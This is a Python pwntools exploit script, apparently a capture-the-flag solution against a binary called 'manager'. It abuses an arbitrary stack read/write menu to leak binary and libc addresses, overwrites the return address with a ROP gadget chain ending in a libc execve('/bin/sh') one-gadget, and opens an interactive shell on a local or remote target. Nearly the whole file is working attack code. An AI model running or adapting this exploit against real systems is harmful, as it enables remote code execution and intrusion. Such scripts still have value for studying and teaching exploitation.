import pwn
import sys
import struct



BIN="./manager"

env={"LD_PRELOAD":"./libc-2.31.so"}


if 'l' in sys.argv[1]:
  tube = pwn.process(BIN, env=env) #, shell=1)
elif "d" in sys.argv[1]:
  tube = pwn.process(BIN, env=env)
  pwn.gdb.attach(tube, '''
''')

else:
  tube = pwn.remote(sys.argv[1], int(sys.argv[2]))

def _parse_one_line(tube):
  l = tube.readline()
  #print(l)
  return int(l.split(b': ')[1])
  

def _read_stuff(tube):
  n2 = _parse_one_line(tube)
  n1 = _parse_one_line(tube)
  #print(n1, n2)
  return struct.pack("II", n1, n2)

def _read_8bytes(tube, offset):
  junk = tube.readuntil(b": ")
  #print(junk)
  tube.sendline("1")
  junk = tube.readuntil(b": ")
  #print(junk)
  tube.sendline(str(offset))
  tube.readline()
  return _read_stuff(tube)

def _write_8bytes(tube, offset, data):
  junk = tube.readuntil(b": ")
  #print(junk)
  tube.sendline("2")
  junk = tube.readuntil(b": ")
  #print(junk)
  tube.sendline(str(offset))
  i1, i2 = data
  tube.sendline(str(i1))
  tube.readline()
  tube.sendline(str(i2))
  tube.readline()


def _lame_hexdump(tube, off):
  tmp = _read_8bytes(tube, off)
  print(f"{off:08X} : {tmp.hex()} : {tmp}")

def _read_relative(tube, off, size):
  tmp = b''
  for pos in range(0, size):
    tmp += _read_8bytes(tube, off + pos)
  return tmp

def _un64(v):
  return struct.unpack("Q", v)[0]

def _safe_str(s):
  return ''.join(chr(x) if x > 32 and x < 127 else '.' for x in s)

def _rel_hexdump(tube, off, size, pad=0):
  data = _read_relative(tube, off, size)
  for i in range(0,size,16):
    chunk = data[i:i+16]
    hexs = ' '.join(hex(x)[2:].rjust(2,'0') for x in chunk)
    print(f"+ 0x{(pad+i):08X} : {hexs} : {_safe_str(chunk)}")

def i64to32(i):
  return struct.unpack("II",struct.pack("Q",i))


# read stuff from stack :)

bin_addr   = _un64(_read_8bytes(tube, 12))
libc_addr  = _un64(_read_8bytes(tube, 7))

print(f"BIN  ADDR  @ {bin_addr:016X}")
print(f"LIBC ADDR  @ {libc_addr:016X}")


if 1==2:
  # Do a local memdump. To get/leak a lot of addreses
  _rel_hexdump(tube, -0x30, 0x2ff)

RET_OFFSET=7
ORG_GADGET=0x00005555555553d4 
# 0x00005555555553d4 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

bin_base  = bin_addr - 0x380 
bin_rop   = bin_base + 0x3d4

bin_rop   = bin_addr + int(sys.argv[3]) #
#                    -------^
#  This crapy hook is caused by fact that server binary was DIFFERENT
#  than one in task.zip. The gadget is still there - we need to fix the offset by few bytes.
#  ... later on ORGs fixed the binary .... :)


libc_base = libc_addr - 0x270B3
libc_rop  = libc_base + 0xe6c7e 
# execve('/bin/sh') : 0x00007fddca908c7e

print(f"BIN  BASE  @ {bin_base:016X}")
print(f"LIBC BASE  @ {libc_base:016X}")

print(f"GADGET BIN   @ {bin_rop:016X}")
print(f"GADGET LIBC  @ {libc_rop:016X}")


_write_8bytes(tube, RET_OFFSET+0, i64to32(bin_rop))
_write_8bytes(tube, RET_OFFSET+1, i64to32(0x0))
_write_8bytes(tube, RET_OFFSET+2, i64to32(0x0))
_write_8bytes(tube, RET_OFFSET+3, i64to32(0x0))
_write_8bytes(tube, RET_OFFSET+4, i64to32(0x0))
_write_8bytes(tube, RET_OFFSET+5, i64to32(libc_rop))

tube.sendline("3")
tube.sendline("w")
print(tube.readline())

tube.interactive()
